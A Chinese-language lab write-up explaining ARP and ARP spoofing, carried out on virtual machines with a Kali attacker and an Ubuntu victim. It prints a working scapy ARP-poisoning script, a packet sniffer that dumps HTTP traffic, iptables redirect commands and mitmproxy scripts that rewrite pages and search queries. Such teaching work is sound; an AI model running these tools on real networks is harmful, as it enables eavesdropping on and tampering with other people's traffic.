# ARP协议 与 ARP欺骗攻击

## ARP协议

ARP（Address Resolution Protocol）地址解析协议是一种在TCP/IP参考模型中工作在网络层的协议。ARP协议的功能是根据IP地址获取MAC地址。

假设同一子网内主机A需要与主机B进行通信，ARP协议工作过程：
1. 主机A根据本机路由表内容，确定用于访问主机B的IP地址。然后A主机在自己的本地ARP缓存中检查主机B的IP地址所匹配的MAC地址。
2. 如果主机A在ARP缓存中没有找到映射，它将询问主机B的IP地址对应的MAC地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。如果主机A在ARP缓存中找到了主机B的IP地址与MAC地址映射，将直接返回。
3. 主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。
4. 主机B将包含其MAC地址的ARP回复消息直接发送回主机A。
5. 当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。

## ARP欺骗攻击

正常情况下，一台主机要通过网关与外部网络进行通信就需要先通过网关的IP地址获取其Mac地址。如果有攻击者在不断的向这台主机发送arp响应包(请求包亦可)，告诉受害者网关的Mac地址是自己的Mac地址，也可以向网关发送arp响应包欺骗网关受害者的Mac地址是自己的Mac地址，使得网关和受害者主机都将错误的地址映射更新到自己的arp缓存中。这样受害者访问外网的数据就都会发给攻击者，如果攻击者将这些数据直接丢弃，那么受害者就无法访问外网。如果攻击者开启了IP转发，并同时欺骗了受害者和网关，那么攻击者就成了受害者与网关之间的中间人，可以对受害者与外部的通信进行窃听或修改。

![arp](https://github.com/DBullet/UCore/blob/master/lab5/arp.png)

## 实验
```
实验环境:
Win7系统VMWare下的两台虚拟机：
Kali 2017.02 IP：192.168.30.132
Ubuntu 16.04 IP：192.168.30.129
网关 192.168.30.2
```
![Ubuntu](https://github.com/DBullet/UCore/blob/master/lab5/boot/image001.png)
![kali](https://github.com/DBullet/UCore/blob/master/lab5/boot/image006.png)
### 1. ARP欺骗
以Kali作为攻击者，Ubuntu作为受害者。

在Kali系统上自带一个名为arpspoof的arp攻击工具
![arpspoof](https://images2015.cnblogs.com/blog/42533/201608/42533-20160824133050901-604285550.png)

参数说明
1. -i：为指定的网络接口，也就是网卡名称
2. -c: 指定在恢复arp配置时使用的硬件地址;在清理时，可以用自己的地址和主机的地址发送数据包
3. -t: 指定要 ARP毒化 的主机(如果没有指定，默认局域网所有主机), 可以重复指定多个主机
4. -r: 毒化两个主机(主机和目标)以捕获两个方向的流量。(只在与 -t 联合使用才有效)
5. host: 指定你希望拦截数据包的主机(通常是本地网关)。

Linux系统下通过`ifconfig`命令输出的段落标题就是本地各个网卡的名称，通常比较简短。Windows系统下的`ipconfig`命令并不能显示出可用的网卡名称。Windows系统获取网卡名称的方法是：控制面板->网络和 Internet->网络连接;
![win](https://github.com/DBullet/UCore/blob/master/lab5/boot/win.png)

图中圈出来的长字符串就是Windows系统无线网卡的名称，其他网卡的名称获取方法类似。


通过直接使用arpspoof可以完成本阶段的实验，但这里通过python的scapy包来简单地模拟实现arpspoof。arpspoof源代码可以参考这篇[arpsoof源码分析](https://blog.csdn.net/rectsuly/article/details/63261412?locationNum=5&fps=1)

scapy相关资料：
文档地址：[http://www.secdev.org/projects/scapy/doc/](http://www.secdev.org/projects/scapy/doc/)
中文版教程：[https://github.com/Larryxi/Scapy_zh-cn](https://github.com/Larryxi/Scapy_zh-cn)

scapy实现的arpspoof源代码如下：./codes/arp.py
```python
from optparse import OptionParser
from scapy.all import get_if_hwaddr, getmacbyip, ARP, Ether, sendp
import sys
import time
def parse_arguments():
    usage = 'Usage: %prog [-i interface] [-t target] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    (options, args) = parser.parse_args()
    if options.interface and options.target and len(args):
        arp_poison(options.interface, options.target, args[0])
    else:
        parser.print_help()
        sys.exit(0)

def arp_poison(interface, target, gateway):
    local_mac = get_if_hwaddr(interface)
    target_mac = getmacbyip(target)
    gateway_mac = getmacbyip(gateway)
    print 'local_mac = {} target_mac = {} gateway_mac = {}'\
        .format(local_mac, target_mac, gateway_mac)
    if not all((local_mac, target_mac, target_mac)):
        print 'Fail to Get MAC Address, Please Check the Arguments'
        sys.exit(0)
    packet_t = Ether(src=local_mac, dst=target_mac) \
        / ARP(hwsrc=local_mac, psrc=gateway, hwdst=target_mac, pdst=target, op=2)
    packet_g = Ether(src=local_mac, dst=gateway_mac) \
        / ARP(hwsrc=local_mac, psrc=target, hwdst=gateway_mac, pdst=gateway, op=2)
    try:
        while True:
            sendp(packet_t, inter=2, iface=interface)
            sendp(packet_g, inter=2, iface=interface)
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    parse_arguments()
```
代码并不复杂，除了print语句外对Python2和Python3并不敏感。`parse_arguments()`函数进行参数的解析，`arp_poison()`函数构造arp欺骗包同时欺骗受害者和网关，并每隔一秒发送数据包。

运行这段代码

![arp.py](https://github.com/DBullet/UCore/blob/master/lab5/image002.png)

很快就可以看到Ubuntu的arp缓存已经被毒害

![arp](https://github.com/DBullet/UCore/blob/master/lab5/boot/image002.png)

这时候Ubuntu无法访问外网

![fail](https://github.com/DBullet/UCore/blob/master/lab5/boot/image003.png)

为了让Ubuntu能访问外网，需要在Kali上开启IP转发，即将Ubuntu发给网关的数据转发给网关，同时将网关发回给Ubuntu的数据转发给Ubuntu，开启转发的命令为`sysctl net.ipv4.ip_forward=1`，这样Ubuntu就又能上网了。这时候Kali就成为了Ubuntu和网关之间通信的中间人，而中间人可以做什么的实验放在下一部分。

![ip-forward](https://github.com/DBullet/UCore/blob/master/lab5/image003.png)
![ok](https://github.com/DBullet/UCore/blob/master/lab5/boot/image004.png)

### 2. 中间人攻击--信息窃听与篡改
在上一部分实验中，通过arp欺骗，Kali成为了Ubuntu和网关之间通信的中间人，作为中间人Kali便能够对通信双方之间的信息进行窃听和篡改。

首先通过一个简单的实验来窃听Ubuntu发向网关的请求。因为Ubuntu发给网关的请求都是经过Kali中间人代为转发，所以Kali只需要抓取通过自身的数据包就能够窃听Ubuntu发出的请求。直接使用抓包软件就能够完成窃听，如果要对数据做精确的过滤和提取则可以使用python脚本。

这里使用python的抓包工具包pcap和解析数据包工具包dpkt来将http请求直接打印出来，如果要过滤更多的请求信息，利用python的正则表达式等工具对数据直接处理即可。

由于Kali上自带了很多依赖工具，如果在其他平台上进行实验可能还需要安装更多的依赖，在Kali下安装工具包的命令为：
```
sudo apt-get install libpcap-dev
pip install pypcap
pip install dpkt
```
抓包的脚本：./codes/wiretap.py
```python
import pcap
import dpkt
import sys
from optparse import OptionParser

def get_interface():
    usage = 'Usage: [-i interface]'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify an interface')
    (options, args) = parser.parse_args()
    if not options.interface:
        parser.print_help()
        sys.exit(0)
    return options.interface

def wiretap(interface):
    worker = pcap.pcap(interface)
    worker.setfilter('tcp port 443 or tcp port 80')
    for (ptime, pdate) in worker:
        packet = dpkt.ethernet.Ethernet(pdate)
        if packet.data.__class__.__name__ == 'IP' \
            and packet.data.data.__class__.__name__ == 'TCP' \
            and (packet.data.data.dport == 443 or packet.data.data.dport == 80):
            http_data = packet.data.data.data
            print http_data

if __name__ == '__main__':
    interface = get_interface()
    wiretap(interface)
```
运行这个脚本。

![wiretap](https://github.com/DBullet/UCore/blob/master/lab5/image004.png)

代码将通过80端口（HTTP）和443端口（HTTPS）的TCP数据打印了出来。Ubuntu分别访问了清华的邮箱服务（HTPP）和百度（HTTPS），这里请留意以下登录表单的账号域名为‘mails.tsinghua.edu.cn’，接下来的实验会对其进行篡改。
![init](https://github.com/DBullet/UCore/blob/master/lab5/boot/init.png)

可以看到Kali这里窃听到的请求数据，由于HTTPS是加密传输，而脚本是在链路层抓取的数据，所以抓取到的HTTPS数据是加密过的数据。

![mails](https://github.com/DBullet/UCore/blob/master/lab5/image005.png)
![baidu](https://github.com/DBullet/UCore/blob/master/lab5/image006.png)

下一步的实验尝试来篡改从网关发到Ubuntu的数据，实验需要使用到mitmproxy工具，且实验要建立在arp欺骗成功的基础上。mitmproxy是一个HTTP代理，其作用正如其名，Man-In-The-Medium，是用来进行中间人攻击的，实际上mitmproxy还有很广泛的用途。mitmproxy的资料可以参考[官方文档](http://mitmproxy.org)和对应的[github仓库](https://github.com/mitmproxy/mitmproxy)。

mitmproxy的安装很简单，执行`pip install mitmproxy`即可。但是这里需要强调的是，要确保使用  **python3.6+** 对应的pip来安装mitmproxy，因为mitmproxy的源代码中使用到的部分语法是从python3.6才开始支持的。如果用python2或者低版本的python3安装，虽然也能安装成功，但是使用过程中会遇到问题

安装成功后运行`mitmproxy --version`来确认，确保这里的python版本为3.6以上。Windows系统上不支持`mitmproxy`命令，可以尝试`mitmdummp`和`mitmweb`命令。
![mitmproxy](https://github.com/DBullet/UCore/blob/master/lab5/boot/mitmproxy.png)

作为中间人的篡改，不能够对客户端进行配置，所以接下来的实验会让mitmproxy运行在透明代理的模式。不同的代理模式可以参考[这篇讲解](http://blog.51cto.com/z00w00/1031287)。
为了使得Ubuntu和网关的通信通过透明代理，还需要通过`iptables`命令开启Linux的路由转发。
开启命令为`iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080`

参数说明：
1. -t table 这个选项指定命令要操作的匹配包的表。此处要操作的NAT表，即网络地址转换表。
2. -A -append 在所选择的链末添加一条或更多规则
3. -i in-interface 包经由该接口接收的可选的入口名称
4. -p protocal规则或者包检查（待检查包）的协议。
5. -j jump target跳转目标

因此上述命令的意义为将网卡eth0上通过端口80的数据重定向到端口8080。
使用之后删除对应的规则的命令就是

![iptable](https://github.com/DBullet/UCore/blob/master/lab5/boot/iptable.png)

-D表示delete，即删除对应的规则。当然iptables命令还有很多其他的参数和用途，这里不需要。但是需要指出一点，iptables的路由转发是发生在网络层。而mitmproxy则工作在应用层，对http协议进行处理。

开启路由转发后，就可以让mitmproxy开始工作了，运行命令`mitmdump --mode transparent -p 8080 -s ./joker.py`。

参数说明：
1. --mode transparent 让mitmproxy运行透明代理模式，旧版本的选项为`-T`
2. -p 指点代理的端口，这里和之前路由转发的端口保持一致，默认也是运行在8080端口
3. -s 使用嵌入脚本。在嵌入脚本中定义事件的处理函数，mitmproxy会在对应的事件发生时调用处理。

这里使用的脚本如下：./codes/joker.py
```python
import mitmproxy.http
from mitmproxy import ctx
class Joker:
    def request(self, flow: mitmproxy.http.HTTPFlow):
        ctx.log.info('get request')
        return
    def response(self, flow: mitmproxy.http.HTTPFlow):
        text = flow.response.get_text()
        text = text.replace('tsinghua','peking')
        ctx.log.info('change response')
        flow.response.set_text(text)

addons = [
    Joker()
]
```
在这个脚本中定义了一个Joker类，并实现了request方法和response方法，这两个方法会在mitmproxy收到http请求和响应时调用，是最常用的两个事件处理方法。之后通过addons变量将定义的处理加入列表。更多的事件响应和相关的语法规则都可以在官方文档中获得。具体而言，这个脚本在收到http请求时会打印出‘get request’，在收到http响应时会打印出‘change response’，并把响应中所有的‘tsinghua’替换会‘peking’后再返回。代码中对python函数的参数指定了类型，这个语法在mitmproxy的源代码中也有用到，这是python3.6才开始支持的特性。

此时Ubuntu再次访问tsinghua的邮件门户网站，注意登录表单的账户域名，已经从‘tsinghua’被替换为‘peking’。说明已经成功地篡改了网关发送给Ubuntu的报文，而Ubuntu对这些都无法感知。
![success](https://github.com/DBullet/UCore/blob/master/lab5/boot/success.png)
![mitmdump](https://github.com/DBullet/UCore/blob/master/lab5/boot/image005.png)
![mitmdump](https://github.com/DBullet/UCore/blob/master/lab5/boot/image007.png)

如果采用https进行加密传输，mitmproxy就无法对原响应进行有意义的篡改了，只能选择完全替换或者盲目修改成解密后无意义的数据。另一方面需要强调的是，这个实验中必须让mitmproxy运行在透明代理模式，因为攻击过程并没有对受害者的客户端做任何修改，客户端也不知道透明代理的存在，所以客户端只会发出普通的http请求，请求头里可能没有schema信息（比如http还是https）或目标主机名（xxx.com）等信息，但路由转发时保留了所有的地址信息。如果mitmproxy不工作在透明代理模式，而是默认的正向代理模式，那么它期望的是收到完整的http请求，这时候转发来的请求就无法进行处理，从而客户端会收到400 Bad Request来表明http请求的格式错误。这一点也可以通过实验来验证。

### 3. mitmproxy正向代理
之前的实验中因为https的加密使得无法对加密数据进行有意义的篡改。而https的加解密发生在传输层，而mitmproxy工作在应用层，那么有没有可能在应用层对解密后的数据进行篡改后在发送给请求者呢？在一定条件下可以。在使用正向代理时，需要客户端进行配置。设置正向代理后，客户端会将自己的请求主动发送给代理，由代理进行服务器的访问，再将返回的数据返还给客户端。这样由代理来发起https请求，加密的数据在代理处就已经解密，再经过篡改后返回给客户端，客户端看到的数据就是篡改后的。
正向代理除了需要客户端进行配置外，还有一个问题就是浏览器对于正向代理服务器会进行证书的检查，如果代理服务器没有可信的证书，浏览器将不会把请求发送给不可信的代理，而通常作为攻击者不会具有权威的可信证书。

然而，在实验环境下，可以通过对浏览器的配置来达成这两个条件。这部分实验的环境为Win7系统，在Win7系统下利用命令行命令直接打开Chrome浏览器。

`"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --proxy-server=127.0.0.1:8080 --ignore-certificate-errors`

命令中的路径因人而异，主要看两个参数，`proxy-server`用来配置正向代理服务器，`ignore-certificate-errors`强制浏览器忽略证书的错误，这样就达成了两个条件。

这样在启用代理之前，可以看到浏览器不能上网，且会显式的提示安全性和稳定性下降。

和之前一样在8080端口开启mitmproxy代理，并嵌入如下脚本。
```python
import mitmproxy.http
from mitmproxy import ctx

class Joker:
	def request(self, flow):
		if flow.request.host == 'www.baidu.com' \
			and 'wd' in flow.request.query.keys():
			flow.request.query.set_all('wd', ['tsinghua'])

	def response(self, flow):
		text = flow.response.get_text()
		text = text.replace('清华', '北京')
		text = text.replace('tsinghua', 'peking')
		flow.response.set_text(text)

addons = [Joker()]
```
这个脚本会将所有通过百度的搜索的关键词替换为‘tsinghua’，并将搜索结果页面中的‘清华’替换为‘北京’，‘tsinghua’替换为‘peking’。

![no-net](https://github.com/DBullet/UCore/blob/master/lab5/kern/trap/no-net.png)
![peking](https://github.com/DBullet/UCore/blob/master/lab5/kern/trap/google.png)